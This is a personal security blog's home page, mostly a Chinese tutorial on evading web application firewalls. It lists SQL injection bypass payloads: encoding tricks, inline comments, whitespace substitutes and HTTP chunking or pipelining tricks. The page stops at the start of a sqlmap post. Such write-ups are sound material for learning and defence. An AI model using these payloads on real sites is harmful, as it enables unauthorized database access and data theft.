<!DOCTYPE html>












  


<html class="theme-next gemini use-motion" lang="en">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">


























<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">

<link rel="stylesheet" href="/css/main.css?v=7.0.1">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.0.1">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.0.1">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.0.1">


  <link rel="mask-icon" href="/images/logo.svg?v=7.0.1" color="#222">







<script id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '7.0.1',
    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
    back2top: true,
    back2top_sidebar: true,
    fancybox: false,
    fastclick: false,
    lazyload: false,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>


  




  <meta property="og:type" content="website">
<meta property="og:title" content="Emerald Dream">
<meta property="og:url" content="https://chirec.github.io/index.html">
<meta property="og:site_name" content="Emerald Dream">
<meta property="og:locale" content="en">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Emerald Dream">






  <link rel="canonical" href="https://chirec.github.io/">



<script id="page.configurations">
  CONFIG.page = {
    sidebar: "",
  };
</script>

  <title>Emerald Dream</title>
  












  <noscript>
  <style>
  .use-motion .motion-element,
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-title { opacity: initial; }

  .use-motion .logo,
  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="en">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Emerald Dream</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
    
    
  </div>

  <div class="site-nav-toggle">
    <button aria-label="Toggle navigation bar">
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>



<nav class="site-nav">
  
    <ul id="menu" class="menu">
      
        
        
        
          
          <li class="menu-item menu-item-home menu-item-active">

    
    
    
      
    

    

    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-archives">

    
    
    
      
    

    

    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>

  </li>

      
      
    </ul>
  

  

  
</nav>



  



</div>
    </header>

    
  
  
  
  

  

  <a href="https://github.com/ChireC" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewbox="0 0 250 250" style="fill: #222; color: #fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a>



    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          
            

          
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://chirec.github.io/2019/04/17/Play-with-WAF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="chessur">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Emerald Dream">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/04/17/Play-with-WAF/" class="post-title-link" itemprop="url">'绕过WAF(自闭教程)'</a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2019-04-17 20:46:23" itemprop="dateCreated datePublished" datetime="2019-04-17T20:46:23+08:00">2019-04-17</time>
            

            
          </span>

          

          
            
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="1-WAF"><a href="#1-WAF" class="headerlink" title="1.WAF"></a>1.WAF</h1><h2 id="1-1-WAF介绍"><a href="#1-1-WAF介绍" class="headerlink" title="1.1 WAF介绍"></a>1.1 WAF介绍</h2><p>WAF是Web Application Firewall的简称。中文名为Web应用防护系统，也称网站应用级入侵防御系统。</p>
<h2 id="1-2-WAF作用"><a href="#1-2-WAF作用" class="headerlink" title="1.2 WAF作用"></a>1.2 WAF作用</h2><h3 id="1-2-1-网络层防护"><a href="#1-2-1-网络层防护" class="headerlink" title="1.2.1 网络层防护"></a>1.2.1 网络层防护</h3><p>拦截DDOS攻击、防御SYN Flood、防御Ack Flood、防御Http/Https Flood</p>
<h3 id="1-2-2-应用层防护"><a href="#1-2-2-应用层防护" class="headerlink" title="1.2.2 应用层防护"></a>1.2.2 应用层防护</h3><p>URL黑白名单、HTTP协议规范、防御注入攻击、防御XSS攻击、防御XXE</p>
<h3 id="1-3-分类"><a href="#1-3-分类" class="headerlink" title="1.3 分类"></a>1.3 分类</h3><p>代码WAF：规则写在代码中</p>
<p>软件WAF：实时监听端口(服务)</p>
<p>硬件WAF：专门的硬件设备 代理流量 分析流量 网络镜像</p>
<p>云WAF：流量传到检测节点中做检测</p>
<h3 id="1-4-工作流程"><a href="#1-4-工作流程" class="headerlink" title="1.4 工作流程"></a>1.4 工作流程</h3><h4 id="1-4-1-身份验证"><a href="#1-4-1-身份验证" class="headerlink" title="1.4.1 身份验证"></a>1.4.1 身份验证</h4><p>白名单(IP、cookie、useragent、referer)<br>黑名单</p>
<h4 id="1-4-2-数据包解析"><a href="#1-4-2-数据包解析" class="headerlink" title="1.4.2 数据包解析"></a>1.4.2 数据包解析</h4><h4 id="1-4-3-匹配规则"><a href="#1-4-3-匹配规则" class="headerlink" title="1.4.3 匹配规则"></a>1.4.3 匹配规则</h4><p>ACL(访问控制列表)</p>
<h1 id="2-Bypass常用方法"><a href="#2-Bypass常用方法" class="headerlink" title="2.Bypass常用方法"></a>2.Bypass常用方法</h1><h2 id="2-1-大小写"><a href="#2-1-大小写" class="headerlink" title="2.1 大小写"></a>2.1 大小写</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=&apos;1 &apos; uNion SelEct 1,2,3,4 --+</span><br></pre></td></tr></table></figure>
<h2 id="2-2-替换关键字-关键字重复写"><a href="#2-2-替换关键字-关键字重复写" class="headerlink" title="2.2 替换关键字(关键字重复写)"></a>2.2 替换关键字(关键字重复写)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1 ununionion selselectect</span><br></pre></td></tr></table></figure>
<h2 id="2-3-编码"><a href="#2-3-编码" class="headerlink" title="2.3 编码"></a>2.3 编码</h2><h3 id="2-3-1-URL编码"><a href="#2-3-1-URL编码" class="headerlink" title="2.3.1 URL编码"></a>2.3.1 URL编码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1 %75nion select</span><br></pre></td></tr></table></figure>
<h3 id="2-3-2-二次URL编码"><a href="#2-3-2-二次URL编码" class="headerlink" title="2.3.2 二次URL编码"></a>2.3.2 二次URL编码</h3><p>将URL编码两次</p>
<h3 id="2-3-3-错误URL编码"><a href="#2-3-3-错误URL编码" class="headerlink" title="2.3.3 错误URL编码"></a>2.3.3 错误URL编码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">union select password from users where id=1</span><br><span class="line">u%nion sel%ect password fr%om users wh%ere id=1</span><br></pre></td></tr></table></figure>
<p>在注入关键词处加上%，WAF会将其取出</p>
<h3 id="2-3-4-Unicode编码"><a href="#2-3-4-Unicode编码" class="headerlink" title="2.3.4 Unicode编码"></a>2.3.4 Unicode编码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">union select password from users where id=1</span><br><span class="line">%u0075%u006e%u0069%u006f%u006e select password from users where id=1</span><br></pre></td></tr></table></figure>
<p>Unicode编码</p>
<h3 id="2-3-5-Nibble编码"><a href="#2-3-5-Nibble编码" class="headerlink" title="2.3.5 Nibble编码"></a>2.3.5 Nibble编码</h3><p>Nibble编码是针对URL编码的%后两位进行二次编码的一种方法。<br>根据编码位置不同，被分为First Nibble、Second Nibble以及Double Nibble三种。</p>
<table>
<thead>
<tr>
<th>Type</th>
<th>Transformation of %61</th>
<th>Result</th>
</tr>
</thead>
<tbody>
<tr>
<td>First Nibble</td>
<td>6 = %36</td>
<td>%%361</td>
</tr>
<tr>
<td>Second Nibble</td>
<td>1 = %31</td>
<td>%6%31</td>
</tr>
<tr>
<td>Double Nibble</td>
<td>6 = %36 1 = %31</td>
<td>%%36%31</td>
</tr>
</tbody>
</table>
<h3 id="2-3-6错误16进制编码"><a href="#2-3-6错误16进制编码" class="headerlink" title="2.3.6错误16进制编码"></a>2.3.6错误16进制编码</h3><table>
<thead>
<tr>
<th>Hex Character</th>
<th>Conversion</th>
<th>Decimal</th>
</tr>
</thead>
<tbody>
<tr>
<td>%61</td>
<td>6*16+1</td>
<td>97</td>
</tr>
<tr>
<td>%2ú</td>
<td>2*16+65</td>
<td>97</td>
</tr>
</tbody>
</table>
<h2 id="2-4-内联注释"><a href="#2-4-内联注释" class="headerlink" title="2.4 内联注释"></a>2.4 内联注释</h2><p><code>/* */</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1 union/**/</span><br></pre></td></tr></table></figure>
<h2 id="2-5-等价函数替换"><a href="#2-5-等价函数替换" class="headerlink" title="2.5 等价函数替换"></a>2.5 等价函数替换</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">version @@version</span><br><span class="line">mid substr substring</span><br><span class="line">@@datadir datadir()</span><br></pre></td></tr></table></figure>
<h2 id="2-6-特殊符号"><a href="#2-6-特殊符号" class="headerlink" title="2.6 特殊符号"></a>2.6 特殊符号</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">+</span><br><span class="line">#</span><br><span class="line">%23</span><br><span class="line">--+</span><br><span class="line">\\\\</span><br><span class="line">||</span><br><span class="line">select`version()`</span><br><span class="line">@ 用户自定义变量</span><br><span class="line">@@ 系统变量</span><br><span class="line">se||lect</span><br><span class="line">%df宽字节</span><br><span class="line">注释符+%0a绕过</span><br></pre></td></tr></table></figure>
<h2 id="2-7-内联注释加！"><a href="#2-7-内联注释加！" class="headerlink" title="2.7 内联注释加！"></a>2.7 内联注释加！</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/*!union*/</span><br></pre></td></tr></table></figure>
<h2 id="2-8-缓冲区溢出"><a href="#2-8-缓冲区溢出" class="headerlink" title="2.8 缓冲区溢出"></a>2.8 缓冲区溢出</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and (select 1)=(select 0xAAAAAAAAAAAA*1000) union select 1,2 verion(),4,5,database(),8,9,10,11,12,13,14,15,16,17,18</span><br></pre></td></tr></table></figure>
<p>0xA*1000指有1000个A</p>
<h2 id="2-9-mysql特性绕过"><a href="#2-9-mysql特性绕过" class="headerlink" title="2.9 mysql特性绕过"></a>2.9 mysql特性绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">= 等于</span><br><span class="line">:= 赋值</span><br><span class="line">@ @+变量名可直接调用</span><br></pre></td></tr></table></figure>
<h2 id="2-10-隐私类型转换"><a href="#2-10-隐私类型转换" class="headerlink" title="2.10 隐私类型转换"></a>2.10 隐私类型转换</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select &apos;a&apos;=0;</span><br><span class="line">select &apos;1admin&apos;=1;</span><br></pre></td></tr></table></figure>
<h2 id="2-11-综合探索"><a href="#2-11-综合探索" class="headerlink" title="2.11 综合探索"></a>2.11 综合探索</h2><p>内联注释<br>黑魔法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select&#123;x user&#125;from&#123;x mysql.user&#125;</span><br></pre></td></tr></table></figure>
<p>换行符绕过：%23%0a %2d%2d%0a</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from admin where id=1[1] union [2]select [3]1,user()[4]from[5]admin</span><br><span class="line">//[]表示检测点</span><br></pre></td></tr></table></figure>
<h3 id="2-11-1"><a href="#2-11-1" class="headerlink" title="2.11.1"></a>2.11.1</h3><h5 id="1-："><a href="#1-：" class="headerlink" title="[1]："></a>[1]：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/**/ /*!50000union*/</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">空白 %09 %0a %0b %0c %0d %20</span><br><span class="line">id=1%0bunion select 1,user() from admin</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">浮点数形式</span><br><span class="line">id=1.0union select 1,user() from admin</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1E0</span><br><span class="line">id=1E0union select 1,user() from admin</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\</span><br><span class="line">id=\Nunion select 1,user() from admin</span><br></pre></td></tr></table></figure>
<h3 id="2-11-2"><a href="#2-11-2" class="headerlink" title="2.11.2"></a>2.11.2</h3><h5 id="2-："><a href="#2-：" class="headerlink" title="[2]："></a>[2]：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">空白</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注释符</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">括号</span><br><span class="line">id=1 union(select &apos;test&apos;,(select user()from admin limit 0,1))</span><br></pre></td></tr></table></figure>
<h3 id="2-11-3"><a href="#2-11-3" class="headerlink" title="2.11.3"></a>2.11.3</h3><h5 id="3-："><a href="#3-：" class="headerlink" title="[3]："></a>[3]：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">空白</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注释符</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">其他字符</span><br><span class="line">！ %21</span><br><span class="line">+ %2b</span><br><span class="line">- %2d</span><br><span class="line">@ %40</span><br><span class="line">~ %7e</span><br><span class="line">id=1 union select~1,user(),version() from admin</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">括号</span><br><span class="line">id=1 union select(1),user(),version() from admin</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">内联注释</span><br><span class="line">id=1 union /*!500000select*/ 1,user(),version() from admin</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#125;</span><br><span class="line">id=1 union select&#123;x 1&#125;,user(),version() from admin</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;</span><br><span class="line">id=1 union select&quot;1&quot;,user(),version() from admin</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\N</span><br><span class="line">id=1 union select\N,user(),version() from admin</span><br></pre></td></tr></table></figure>
<h3 id="2-11-4"><a href="#2-11-4" class="headerlink" title="2.11.4"></a>2.11.4</h3><h5 id="4-："><a href="#4-：" class="headerlink" title="[4]："></a>[4]：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">空白</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注释符</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">其他字符</span><br><span class="line">` %60</span><br><span class="line">id=1 union select 1,user(),version()`from admin`</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">内联注释</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">括号</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">加字母</span><br><span class="line">id=1 union select 1,user(),version()Afrom admin</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">浮点数、1E0、\N</span><br></pre></td></tr></table></figure>
<h3 id="2-11-5"><a href="#2-11-5" class="headerlink" title="2.11.5"></a>2.11.5</h3><h5 id="5-："><a href="#5-：" class="headerlink" title="[5]："></a>[5]：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">空白</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注释符</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">其他符号</span><br><span class="line">中文破折号</span><br><span class="line">id=1 union select 1,user(),version() from——admin</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">内联注释</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#125;</span><br><span class="line">id=1 union select 1,user(),version() from&#123;x admin&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">()</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th style="text-align:center">1</th>
<th style="text-align:center">2</th>
<th style="text-align:center">2</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">1</td>
<td style="text-align:center">2</td>
<td style="text-align:center">2</td>
</tr>
<tr>
<td style="text-align:center">1</td>
<td style="text-align:center">2</td>
<td style="text-align:center">2</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
</tbody>
</table>
<h3 id="2-12-空白"><a href="#2-12-空白" class="headerlink" title="2.12 空白"></a>2.12 空白</h3><table>
<thead>
<tr>
<th style="text-align:center">RDBMS</th>
<th style="text-align:center">Allowed  whitespaces</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">SQLite 3</td>
<td style="text-align:center">0A,0D,0C,09,20</td>
</tr>
<tr>
<td style="text-align:center">MySQL 5</td>
<td style="text-align:center">09,0A,0B,0C,0D,A0,20</td>
</tr>
<tr>
<td style="text-align:center">Oracle 11g</td>
<td style="text-align:center">00,09,0A,0B,0C,0D,20</td>
</tr>
<tr>
<td style="text-align:center">MSSQL 2008</td>
<td style="text-align:center">01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20,25</td>
</tr>
</tbody>
</table>
<h4 id="2-13-特殊位置代替空格"><a href="#2-13-特殊位置代替空格" class="headerlink" title="2.13 特殊位置代替空格"></a>2.13 特殊位置代替空格</h4><p>科学计数法(1e0,.)<br>数学计算(+-*/)<br>特殊字符(\N)<br>注释符(/**/)</p>
<h5 id="2-14-无空格的查询"><a href="#2-14-无空格的查询" class="headerlink" title="2.14 无空格的查询"></a>2.14 无空格的查询</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1e0and&#123;``select(left(database(),1))&#125;</span><br></pre></td></tr></table></figure>
<h1 id="3-基于HTTP协议的绕过方式"><a href="#3-基于HTTP协议的绕过方式" class="headerlink" title="3. 基于HTTP协议的绕过方式"></a>3. 基于HTTP协议的绕过方式</h1><p>OWASP AppSec Europe<br>WAF Bypass Techniques-Using HTTP Standard and Web Servers’ Behaviour -- Soroush Dalili</p>
<h2 id="3-1-基于HTTP0-9协议的绕过方式"><a href="#3-1-基于HTTP0-9协议的绕过方式" class="headerlink" title="3.1 基于HTTP0.9协议的绕过方式"></a>3.1 基于HTTP0.9协议的绕过方式</h2><h2 id="3-2-HTTP隧道传输-HTTP-pipline"><a href="#3-2-HTTP隧道传输-HTTP-pipline" class="headerlink" title="3.2 HTTP隧道传输/HTTP pipline"></a>3.2 HTTP隧道传输/HTTP pipline</h2><p><img src="/2019/04/17/Play-with-WAF/1555423819940.png" alt="1555423819940"></p>
<p>通过BP拦包，在一个请求下添加多个请求，注意需要修改</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Connection:keep-alive</span><br><span class="line">Content-Length:</span><br></pre></td></tr></table></figure>
<h2 id="3-3-畸形包"><a href="#3-3-畸形包" class="headerlink" title="3.3 畸形包"></a>3.3 畸形包</h2><p><img src="/2019/04/17/Play-with-WAF/1555462234327.png" alt="1555462234327"></p>
<p>由于<code>c=2&amp;d=2</code>后面的内容WAF并能不识别，所以GET后面的Payload没有被WAF拦截掉</p>
<h2 id="3-4-分块传输-Chunked-Transfer"><a href="#3-4-分块传输-Chunked-Transfer" class="headerlink" title="3.4 分块传输/Chunked Transfer"></a>3.4 分块传输/Chunked Transfer</h2><p>通过使用HTTP头<code>Transfer-Encoding:chunked</code>设置达到分割参数的效果<br>在HTTP/1.1下使用</p>
<p>奇数行表示下一行的数据长度，使用16机制表示<br>偶数行表示传输的数据<br>在最后一行写0，并在0后写入多个回车<br>0后没有回车会没有响应</p>
<h2 id="3-5-协议未覆盖"><a href="#3-5-协议未覆盖" class="headerlink" title="3.5 协议未覆盖"></a>3.5 协议未覆盖</h2><p>以下四种常见的content-type类型，我们可以尝试互相替换尝试绕过WAF过滤机制。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Content-Type:text/html;charset=UTF-8</span><br><span class="line">Content-Type:application/json;charset=utf-8</span><br><span class="line">Content-Type:application/x-www-form-urlencoded;charset=utf-8</span><br><span class="line">Content-Type:multipart/form-data;boundary=something</span><br></pre></td></tr></table></figure>
<p>注：如图常见的绕过方式为使用multipart/form-data标签，并把name设为参数名内容写入注入语句。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title=".参考"></a>.参考</h1><p>[1] <a href="https://www.bilibili.com/video/av34035812" target="_blank" rel="noopener">漏洞银行丨一般人我不告诉的WAF绕过新姿势-1337G丨咖面74期</a></p>
<p>[2] <a href="https://soroush.secproject.com/blog/2017/09/additional-notes-on-a-forgotten-http-invisibility-cloak-talk/" target="_blank" rel="noopener">Additional notes on “A Forgotten HTTP Invisibility Cloak” talk!</a></p>

          
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://chirec.github.io/2019/04/14/Sqlmap-Usage/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="chessur">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Emerald Dream">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/04/14/Sqlmap-Usage/" class="post-title-link" itemprop="url">'Sqlmap使用手册(未完成)'</a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2019-04-14 17:03:02" itemprop="dateCreated datePublished" datetime="2019-04-14T17:03:02+08:00">2019-04-14</time>
            

            
          </span>

          

          
            
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
